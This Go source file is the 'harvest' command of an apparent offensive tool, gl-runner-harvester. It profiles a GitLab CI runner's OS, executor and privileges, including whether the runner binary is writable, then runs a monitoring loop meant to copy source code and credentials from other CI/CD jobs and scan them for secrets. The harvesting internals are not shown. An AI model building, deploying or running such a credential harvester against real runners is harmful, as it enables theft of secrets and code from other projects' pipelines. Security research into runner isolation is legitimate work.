package cmd

import (
	"github.com/frjcomp/gl-runner-harvester/internal/detector"
	"github.com/frjcomp/gl-runner-harvester/internal/harvester"
	"github.com/frjcomp/gl-runner-harvester/internal/monitor"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
)

var (
	outputDir string
	interval  int
	scanSecrets bool
)

var harvestCmd = &cobra.Command{
	Use:   "harvest",
	Short: "Start harvesting CI/CD jobs from GitLab runners",
	Long: `harvest detects the runner environment, monitors for active CI/CD jobs,
copies source code and credentials, and optionally scans for secrets.`,
	RunE: runHarvest,
}

func init() {
	harvestCmd.Flags().StringVar(&outputDir, "output-dir", "/tmp/gl-harvest", "Directory to store harvested data")
	harvestCmd.Flags().IntVar(&interval, "interval", 30, "Polling interval in seconds")
	harvestCmd.Flags().BoolVar(&scanSecrets, "scan", true, "Enable secret scanning on harvested data")
}

func runHarvest(cmd *cobra.Command, args []string) error {
	// 1. Detect OS info
	osInfo := detector.DetectOS()
	log.Info().
		Str("os", osInfo.OS).
		Str("arch", osInfo.Arch).
		Str("hostname", osInfo.Hostname).
		Msg("Detected OS info")

	// 2. Detect executor type
	execType, execMeta := detector.DetectExecutor()
	log.Info().
		Str("executor", string(execType)).
		Interface("metadata", execMeta).
		Msg("Detected executor type")

	// 3. Check permissions
	permInfo := detector.CheckPermissions(osInfo.OS)
	log.Info().
		Bool("is_privileged", permInfo.IsPrivileged).
		Str("username", permInfo.Username).
		Bool("runner_writable", permInfo.RunnerBinaryWritable).
		Str("runner_path", permInfo.RunnerBinaryPath).
		Msg("Permission check")

	// 4. Print detection summary
	printDetectionSummary(osInfo, execType, permInfo)

	// 5. Create harvester
	h := harvester.New(outputDir, scanSecrets)

	// 6. Start monitoring loop
	m := monitor.New(osInfo, execType, interval, h)
	log.Info().Int("interval_seconds", interval).Str("output_dir", outputDir).Msg("Starting monitor")
	return m.Start()
}

func printDetectionSummary(osInfo detector.OSInfo, execType detector.ExecutorType, permInfo detector.PermissionInfo) {
	log.Info().Msg("=== Detection Summary ===")

	switch execType {
	case detector.Shell, detector.SSH:
		if osInfo.OS == "windows" {
			log.Info().Msg("Windows shell executor: checking binary writability and custom users")
		} else {
			log.Info().Msg("Linux/macOS shell executor: checking root or custom user context")
		}
	case detector.Docker:
		log.Info().Msg("Docker executor: will monitor build tmp directories")
	case detector.Kubernetes:
		log.Info().Msg("Kubernetes executor: will monitor build directories and env vars")
	default:
		log.Warn().Msg("Unknown executor type; attempting generic monitoring")
	}

	if permInfo.IsPrivileged {
		log.Warn().Msg("Running with elevated privileges — full system access possible")
	}
}
